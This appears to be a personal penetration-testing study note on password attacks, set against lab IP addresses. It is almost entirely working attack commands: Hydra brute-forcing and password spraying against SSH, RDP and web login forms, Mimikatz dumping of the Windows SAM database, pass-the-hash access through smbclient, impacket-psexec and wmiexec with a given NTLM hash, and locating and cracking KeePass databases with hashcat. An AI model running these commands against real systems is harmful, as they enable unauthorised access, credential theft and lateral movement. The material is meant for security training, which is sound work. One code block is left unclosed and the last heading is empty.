[[Notes/Password Attacks|Password Attacks]]

# Attacking Network Service Logins
## SSH and RDP logins
### THC-Hydra
TAGS: #hydra #password-cracking #dictionary-attack #ssh #rdp
```shell
# unzip if it wasn't already
sudo gzip -d rockyou.txt.gz

# simple hydra command
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
#### Password Spraying
```shell
# password sparying with a list of usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## HTTP POST login forms
```shell
# put things in place after we have intercepted with burp (could utilize burp's intruder?)
# hydra -l ^username^ -P ^password list path^ ^host^ http-post-form "location:var1=^username^:var2=^PASS^:^login_failed_text^"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

# Password Cracking
```shell
echo -n "secret" | sha256sum #-n for eliminating new line

# wordcount
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c

# hashcat benchmaerk
hashcat -b
# OR
hashcat.exe -b

# calculate
(($word_count^$password_length)/$hash_rate*100000) = $seconds
```

## Wordlist mutation
USEFUL LINK : https://hashcat.net/wiki/doku.php?id=rule_based_attack
```shell
# remove lines start with "1", -i instantanious /^1 start with "1", /d delete
sed -i '/^1/d' wordlist.txt

# rule file to append "1" to the end of each line
echo \$1 > rule.rule

# hashcat in debugging mode with -r for rule sets
hashcat -r demo.rule --stdout wordlist.txt

# capitalize the first letter and add "1" at the end of line
cat rule1.rule
$1 c

# same as above, but it will do the jobs separately
cat rule2.rule
$1
c

# premade rule files for hashcat
ls -la /usr/share/hashcat/rules/

```

## Cracking Methodology

```shell
# identifying hashes
hash-identifier

Enter Hash : 

# if it cannnot identify
hashcat hash.txt

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+=================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
   #<SNIP>
```
## Cracking NTLM
```powershell
# Getting all users
Get-LocalUser

# mimikatz (open with elevated privileged)
.\mimikatz.exe

## inside mimikatz

# see out privilege
mimikatz # privilege::debug

# elevate to system
mimikatz # token::elevate

# dump the SAM database
lsadump::sam
```

```shell
# hashcat to crack
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

## Passing NTLM
```shell
# pass the hash to SMB service
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash <-hash->

# use PSexec (this will get nt-authority)
# don't forget to add LM hash as 16*0
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

#wmiexec (get the ntlm owner shell)
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

## Password Manager

```powershell
# search for the db file
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
# keepass to JtR
keepass2john Database.kdbx > keepass.hash
# example hash
cat keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
# Eliminate the database, just store the hash as hash

# look for the mode
hashcat --help | grep -i "KeePass"

# Crackin' time
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
# Working with Hashes





```